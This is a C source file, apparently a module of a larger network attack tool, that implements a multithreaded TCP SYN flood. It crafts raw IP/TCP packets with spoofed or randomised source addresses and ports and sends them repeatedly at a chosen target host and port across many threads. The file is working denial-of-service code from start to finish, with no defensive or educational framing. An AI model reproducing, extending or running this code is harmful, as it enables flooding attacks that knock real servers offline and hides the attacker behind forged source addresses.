#include <stdio.h>  // for memset
#include <string.h> // strlen
#include <stdlib.h> // exit
#include <errno.h>  // errno
#include <stdarg.h> // va_list
#include <pthread.h>

#include <unistd.h> // close
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h> // inet_addr
#include <signal.h>

#include "../main.h"

static int _send_syn_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rt)
{
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // create a raw socket
    if (socket_fd < 0)
    {
        /*
        * if errno == 1
        *   This program should run as root user
        * if errno == 24
        *   You shoud check max file number use 'ulimit -n' in linux
        *   And change the max file number use 'ulimit -n <setting number>'
        */
        error(strerror(errno));
    }
    // char datagram[4096] = {'\0'}; // datagram to represent the packet
    char *datagram = (char *)calloc(sizeof(struct ip) + sizeof(struct tcphdr), sizeof(char));

    struct ip *iph = (struct ip *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));

    // for sendto user
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = inet_addr(daddr);

    /*
     * fill in the IP header
     * 0                                       31
     * |----|----|------|--|-------------------|
     * |ver |ihl | -tos | -|    tot_len        |
     * |----|----|------|--|-------------------|
     * |       id          |   frag_off       -|
     * |---------|---------|-------------------|
     * |   ttl   |protocol |    check          |
     * |---------|---------|-------------------|
     * |                saddr                  |
     * |---------------------------------------|
     * |                daddr                  |
     * |---------------------------------------|
     * |                                       |
    -* |                options                |
     * |                                       |
     * |---------------------------------------|
     */
    iph->ip_v= 4;
    iph->ip_hl = 5; // header length
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(randport()); // unsigned 16 bits from 0 to 65535
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;                       // set to 0 before calculating checksum
    iph->ip_src.s_addr = inet_addr(saddr); // spoof the source ip address
    iph->ip_dst.s_addr = inet_addr(daddr);
    iph->ip_sum = htons(checksum((unsigned short *)datagram, sizeof(struct ip), NULL, 0));

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = htons(randport()); // 32 bits but we just have 16 bits's value
    tcph->ack_seq = 0;
    tcph->doff = 5; // tcp header length is 20 Bytes
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(65535); // maximum allowed window size
    tcph->check = 0;
    tcph->urg_ptr = 0;
    /*
     * if you set a checksum to zero, your kernel's IP stack
     * should fill in the correct checksum during transmission.
     */

    struct pseudo_header_tcp *psh = (struct pseudo_header_tcp *)malloc(sizeof(struct pseudo_header_tcp));
    psh->saddr = inet_addr(saddr);
    psh->daddr = sin.sin_addr.s_addr;
    psh->placeholder = 0;
    psh->protocol = IPPROTO_TCP;
    psh->tcp_length = htons(20);
    memcpy(&psh->tcph, tcph, sizeof(struct tcphdr));
    tcph->check = htons(checksum((unsigned short *)psh, sizeof(struct pseudo_header_tcp), NULL, 0));
    free(psh);

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        error("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
        error("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);

    // send the packet (same source ip address)
    for (int i = 0; i < rt; i++)
        if (sendto(socket_fd, datagram, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            error(strerror(errno));

    close(socket_fd);
    return 0;
}

static void _attack_thread(pSFTP parameters)
{
    char *daddr = parameters->daddr;
    int dport = parameters->dport;
    int rt = parameters->rt;

#ifdef DEBUG
    char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
    saddr = randip(&saddr);
    int sport = randport();
    warning("thread start...");
    warning("sending syn package...");
    _send_syn_packet(daddr, dport, saddr, sport, rt);
    free(saddr);
#else
    unsigned int pn = parameters->pn;
    if (parameters->rdsrc)
    {
        char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
        int sport;
        for (unsigned int i = 1; i != pn; i++)
        {
            saddr = randip(&saddr);
            sport = randport();
            _send_syn_packet(daddr, dport, saddr, sport, rt);
        }
        free(saddr);
    }
    else
    {
        char *saddr = parameters->saddr;
        int sport = parameters->sport;
        for (unsigned int i = 1; i != pn; i++)
        {
            _send_syn_packet(daddr, dport, saddr, sport, rt);
        }
    }
#endif
}

int syn_flood_attack(char *url, int port, ...)
{
    /*
     * parameters:
     * 0 - url
     * 1 - port
     * 2 - random source address label (int)
     * 3 - random source address repetition time (int)
     * 4 - thread number (int)
     * 5 - source ip address (char *)
     * 6 - source port (int)
     * 7 - packet number (unsigned int)
     */

    va_list vlist;
    va_start(vlist, port);
    int rdsrc = va_arg(vlist, int);                 // 2
    int rt = va_arg(vlist, int);                    // 3
    int thread_number = va_arg(vlist, int);         // 4
    char *saddr = va_arg(vlist, char *);            // 5
    int sport = va_arg(vlist, int);                 // 6
    unsigned int pn = va_arg(vlist, unsigned int);  // 7s
    va_end(vlist);

    pSFTP parameters = (pSFTP)malloc(sizeof(SFTP));
    parameters->daddr = url;
    parameters->dport = port;
    parameters->rdsrc = rdsrc;
    parameters->rt = rt;
    parameters->saddr = saddr;
    parameters->sport = sport;
    parameters->pn = pn;

    pthread_t tid_list[thread_number];
    pthread_attr_t attr;
    int ret;

    if (strlen(url))
        if (strstr(url, "http"))
            error("syn flood attack target's address should not include 'http' or 'https'");

    if (port == 0)
        error("please specify a target port");

    int i;
    for (i = 0; i < thread_number; i++)
    {
        if (pthread_attr_init(&attr))
            error(strerror(errno));

        // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            error(strerror(errno));

        // create thread
        ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
        if (ret != 0)
        {
            error("create pthread failed, ret: %d, %s", ret, strerror(errno));
            free(parameters);
        }

        pthread_attr_destroy(&attr);
    }
    // pthread_detach(tid);
    // join them all
    for (i = 0; i < thread_number; i++)
        pthread_join(tid_list[i], NULL);

    free(parameters);
    return 0;
}
